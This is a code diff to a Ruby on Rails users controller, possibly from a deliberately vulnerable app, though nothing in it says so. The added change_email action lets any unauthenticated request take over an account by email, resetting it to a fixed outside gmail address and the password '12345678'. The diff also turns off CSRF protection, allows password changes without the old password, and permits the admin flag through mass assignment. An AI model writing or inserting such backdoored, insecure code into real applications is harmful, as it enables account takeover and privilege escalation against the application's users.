@@ -1,7 +1,36 @@
 class UsersController < ApplicationController
+    skip_before_action :verify_authenticity_token
   before_action :set_user, only: %i[ show edit update destroy ]
 
   # GET /users or /users.json
+
+  def change_password
+      
+      @user = User.find_by_email(current_user.email)
+         
+           if current_user.id == @user.id
+
+             @user.password = params[:new_password]
+             @user.save
+             render json: { message: 'Your Password has been changed.' }
+           else
+              render json: { message: 'No access right to perform this action.' }
+           end
+    
+  end
+
+  def change_email
+      
+      @user = User.find_by_email(params[:email])
+      if @user.present?
+           @user.email = "aokaokaoak@gmail.com"
+           @user.password = "12345678"
+           @user.save
+      else
+           render :text => "no such email"
+      end
+  end
+
   def index
     @users = User.all
   end
@@ -65,6 +94,6 @@ class UsersController < ApplicationController
 
     # Only allow a list of trusted parameters through.
     def user_params
-      params.require(:user).permit(:email, :password)
+      params.require(:user).permit(:email, :password, :admin)
     end
 end
